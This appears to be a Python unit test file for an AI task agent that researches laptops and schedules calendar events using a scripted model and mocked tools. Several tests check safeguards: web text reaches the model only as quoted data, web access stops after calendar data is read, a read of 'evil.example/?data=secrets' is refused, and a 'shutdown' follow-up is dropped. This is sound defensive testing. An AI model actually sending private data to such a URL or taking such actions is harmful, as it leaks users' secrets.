"""Multi-step tasks with a scripted model: no network, calendar or real files."""
import asyncio
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, patch

from app.agents import task_agent
from app.agents.task_agent import MAX_STEPS, TaskAgent, TaskStopped, save_report
from app.tools.productivity.task_tool import TaskTool

RESULTS = [{"url": "https://shop.example/laptop-a", "title": "Laptop A review", "snippet": "Laptop A costs 55,000."},
           {"url": "https://news.example/best", "title": "Best laptops", "snippet": "Top picks under 60k."}]


class Script:
    """Plays back the model's JSON replies and records what it was shown."""

    def __init__(self, *replies):
        self.replies = [json.dumps(r) if isinstance(r, dict) else r for r in replies]
        self.seen = []

    async def __call__(self, system, message):
        self.seen.append(message)
        return self.replies.pop(0) if self.replies else json.dumps({"done": True, "answer": "ran out"})


class TaskAgentTests(unittest.TestCase):
    def setUp(self):
        self.patches = [
            patch("app.tools.web.sources.search", AsyncMock(return_value=RESULTS)),
            patch("app.tools.web.sources.pages_text", AsyncMock(return_value=["Laptop A costs 55,000 and has 16 GB RAM.", ""])),
            patch("app.tools.web.sources.page_text", AsyncMock(return_value="Full review text.")),
        ]
        for p in self.patches:
            p.start()

    def tearDown(self):
        for p in self.patches:
            p.stop()

    def run_agent(self, script):
        return asyncio.run(TaskAgent(ask=script, compact=True).run("compare laptops under 60k"))

    def test_research_then_answer(self):
        script = Script({"step": {"skill": "search_web", "args": {"query": "laptops under 60k"}}},
                        {"done": True, "answer": "Laptop A is the best value.", "title": "Laptops", "report": "- Laptop A: 55,000"})
        result = self.run_agent(script)
        self.assertEqual(result["answer"], "Laptop A is the best value.")
        self.assertEqual(result["steps"], ["Searching: laptops under 60k"])
        self.assertIn("<observation>", script.seen[1])  # web text reaches the model only as quoted data
        self.assertIn("16 GB RAM", script.seen[1])

    def test_private_data_turns_off_the_web(self):
        with patch("app.integrations.google.calendar.google_calendar.events", AsyncMock(return_value=[])):
            script = Script({"step": {"skill": "calendar", "args": {"start": "2026-10-19", "days": 7}}},
                            {"step": {"skill": "search_web", "args": {"query": "secret meeting with Priya"}}},
                            {"done": True, "answer": "ok"})
            self.run_agent(script)
        task_agent_search = task_agent  # noqa: F841 (module kept for clarity)
        self.assertIn("web skills are off", script.seen[2])

    def test_only_pages_from_results_can_be_read(self):
        script = Script({"step": {"skill": "read_page", "args": {"url": "https://evil.example/?data=secrets"}}},
                        {"done": True, "answer": "ok"})
        self.run_agent(script)
        self.assertIn("Only pages from this task's search results", script.seen[1])

    def test_step_limit_forces_an_answer(self):
        script = Script(*[{"step": {"skill": "search_web", "args": {"query": f"q{i}"}}} for i in range(MAX_STEPS + 3)])
        result = self.run_agent(script)
        self.assertEqual(len(result["steps"]), MAX_STEPS)
        self.assertIn("last step", script.seen[-1])

    def test_unparseable_reply_ends_gracefully(self):
        self.assertEqual(self.run_agent(Script("Laptop A is best."))["answer"], "Laptop A is best.")

    def test_cut_off_final_reply_still_answers(self):
        cut = '{"done": true, "answer": "Laptop A is best.", "title": "Laptops", "report": "- Laptop A: 55,0'
        result = self.run_agent(Script(cut))
        self.assertEqual((result["answer"], result["title"]), ("Laptop A is best.", "Laptops"))
        self.assertNotIn("{", result["answer"])

    def test_stop(self):
        agent = TaskAgent(ask=Script({"done": True, "answer": "x"}), compact=True)
        agent.stop_requested = True
        with self.assertRaises(TaskStopped):
            asyncio.run(agent.run("anything"))

    def test_only_allowed_follow_ups(self):
        result = self.run_agent(Script({"done": True, "answer": "ok", "follow_up": {"operation": "shutdown", "target": "pc"}}))
        self.assertIsNone(result["follow_up"])


class TaskToolTests(unittest.TestCase):
    def test_report_saved_and_action_waits_for_yes(self):
        outcome = {"answer": "Tuesday 3 PM is free.", "title": "Dentist", "report": "- Tue 15:00 free", "steps": ["a", "b"],
                   "follow_up": {"operation": "schedule", "target": "Dentist",
                                 "parameters": {"at": "2026-10-20T15:00"}, "question": "Add Dentist on Tuesday at 3 PM?"}}
        with tempfile.TemporaryDirectory() as folder, \
             patch.object(TaskAgent, "run", AsyncMock(return_value=outcome)), \
             patch("app.agents.task_agent.save_report", side_effect=lambda *a: save_report(*a, folder=Path(folder))):
            result = asyncio.run(TaskTool().execute({"operation": "task", "target": "find time for the dentist"}))
            saved = list(Path(folder).glob("*.md"))
            self.assertEqual(len(saved), 1)
            self.assertIn("Tue 15:00 free", saved[0].read_text(encoding="utf-8"))
        self.assertIn("Add Dentist on Tuesday at 3 PM?", result["summary"])
        self.assertEqual(result["confirmation"]["capability"], "create_event")
        self.assertEqual(result["confirmation"]["parameters"], {"at": "2026-10-20T15:00"})

    def test_follow_up_details_survive_the_yes(self):
        from app.router.manager import RouterManager
        from app.router.schemas import IntentType

        router = RouterManager.__new__(RouterManager)
        router._pending = {}
        res = {"result": {"confirmation": {"capability": "create_event", "operation": "schedule", "target": "Dentist",
                                           "parameters": {"at": "2026-10-20T15:00"}, "question": "Add it?"}}}
        router._hold_tool_follow_up(res, None, "find time", "u", "s", IntentType.TOOL_EXECUTION, 0.9, None)
        node = router._pending[("u", "s")].graph.nodes[0]
        self.assertEqual(node.arguments["parameters"], {"at": "2026-10-20T15:00"})


if __name__ == "__main__":
    unittest.main()
